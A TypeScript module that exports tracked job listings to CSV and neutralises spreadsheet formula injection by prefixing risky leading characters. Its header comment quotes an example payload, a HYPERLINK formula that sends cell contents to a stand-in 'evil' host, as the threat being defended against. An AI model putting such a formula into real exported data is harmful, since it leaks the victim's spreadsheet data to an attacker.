// -----------------------------------------------------------------------------
// CSV export
// -----------------------------------------------------------------------------
//
// Turns tracked jobs into a file that opens correctly in Excel, Numbers, and
// Google Sheets.
//
// ---------------------------------------------------------------------------
// CSV INJECTION IS THE REASON THIS IS A MODULE AND NOT A `.join(',')`
//
// A spreadsheet treats a cell beginning with `=`, `+`, `-`, `@`, TAB or CR as a
// FORMULA, not text. So a job title of
//
//     =HYPERLINK("http://evil/?"&A1,"Click")
//
// becomes a live formula in the victim's spreadsheet when they open the export.
// Excel's DDE syntax can go further and attempt to launch a local process; users
// get a warning prompt, but a file they exported from their own account is exactly
// the file they will click through.
//
// This matters here specifically because EVERY FIELD IS ATTACKER-INFLUENCED. Job
// titles, companies and descriptions are fetched from third-party job boards, and
// notes are free text. Nothing in this pipeline is authored by us.
//
// The mitigation is to prefix a dangerous leading character with an apostrophe,
// which spreadsheets consume as "treat the rest as literal text". The apostrophe
// is not visible in the cell.
//
// ---------------------------------------------------------------------------
// WHY THE BOM
//
// Excel on Windows assumes the system codepage for a .csv with no byte-order
// mark, so "Bengaluru" survives but a rupee sign or an accented name does not. A
// UTF-8 BOM makes Excel read it as UTF-8. Other tools ignore it.

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Escape one value for a CSV cell.
 *
 * Two independent concerns, in this order:
 *   1. Formula neutralisation — prefix a dangerous leading character.
 *   2. CSV quoting — wrap in quotes and double any internal quote, so commas,
 *      newlines, and quotes inside a value cannot break the row structure.
 *
 * Order matters: the apostrophe must be inside the quoted field, not outside it.
 */
export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let text = String(value);

  // A leading minus is the awkward case: '-5 days' is text, but so is the
  // negative number '-5', and Excel is happy to treat either as a formula start.
  // Neutralising both is correct — a number that arrives here is being exported
  // as a label, and a leading apostrophe costs nothing.
  if (text.length > 0 && FORMULA_TRIGGERS.has(text[0])) {
    text = `'${text}`;
  }

  // Newlines are preserved rather than stripped: a multi-line note is legitimate
  // content, and quoting makes it safe inside one cell.
  return `"${text.replace(/"/g, '""')}"`;
}

/** One row, already ordered to match the header. */
export type CsvRow = readonly unknown[];

/**
 * Serialise a header and rows into a CSV document.
 *
 * CRLF line endings, because that is what RFC 4180 specifies and what Excel
 * expects; every other tool accepts them.
 */
export function toCsv(header: readonly string[], rows: readonly CsvRow[]): string {
  const lines = [header.map(escapeCsvCell).join(',')];
  for (const row of rows) lines.push(row.map(escapeCsvCell).join(','));
  // U+FEFF so Excel reads the file as UTF-8 — see the header note.
  return `\uFEFF${lines.join('\r\n')}\r\n`;
}

/** A tracked job as the export sees it. */
export interface ExportableJob {
  company: string;
  job_title: string;
  location: string | null;
  is_remote: boolean;
  status: string;
  match_score: number | null;
  url: string | null;
  notes: string | null;
  applied_at: string | null;
  created_at: string;
  source: string;
}

/**
 * Column order for the export.
 *
 * Ordered for reading rather than for the database: the columns a person scans
 * first — who, what, where, how well matched — come before provenance and dates.
 */
const COLUMNS = [
  'Company',
  'Role',
  'Location',
  'Remote',
  'Status',
  'Match score',
  'Applied on',
  'Saved on',
  'Source',
  'Link',
  'Notes',
] as const;

/** Render tracked jobs as a CSV document. */
export function jobsToCsv(jobs: readonly ExportableJob[]): string {
  const rows: CsvRow[] = jobs.map((j) => [
    j.company,
    j.job_title,
    j.location ?? '',
    j.is_remote ? 'Yes' : 'No',
    // Title-cased for a human reading a spreadsheet, not the raw enum.
    j.status.charAt(0).toUpperCase() + j.status.slice(1),
    j.match_score ?? '',
    formatDate(j.applied_at),
    formatDate(j.created_at),
    j.source,
    j.url ?? '',
    j.notes ?? '',
  ]);

  return toCsv(COLUMNS, rows);
}

/**
 * ISO timestamp to `YYYY-MM-DD`.
 *
 * Deliberately not a localised format: `DD/MM/YYYY` and `MM/DD/YYYY` are
 * indistinguishable in a spreadsheet and silently mis-sort, and an ISO date sorts
 * correctly as plain text in every tool.
 */
function formatDate(iso: string | null): string {
  if (!iso) return '';
  const date = new Date(iso);
  if (Number.isNaN(date.getTime())) return '';
  return date.toISOString().slice(0, 10);
}

/**
 * A filename-safe, dated attachment name for any export.
 *
 * The date is in the name because these get downloaded repeatedly and a folder of
 * `export.csv`, `export (1).csv`, `export (2).csv` is useless.
 *
 * `slug` is sanitised rather than trusted. It is a caller-supplied string that
 * ends up inside a `Content-Disposition` header, and a quote or newline there is a
 * header-injection bug, not a cosmetic one — so everything outside
 * `[a-z0-9-]` is collapsed away.
 */
export function datedCsvFilename(slug: string, now: Date = new Date()): string {
  const safe = slug
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
  return `unviewable-${safe || 'export'}-${now.toISOString().slice(0, 10)}.csv`;
}

/** The tracked-jobs export filename. */
export function csvFilename(now: Date = new Date()): string {
  return datedCsvFilename('jobs', now);
}
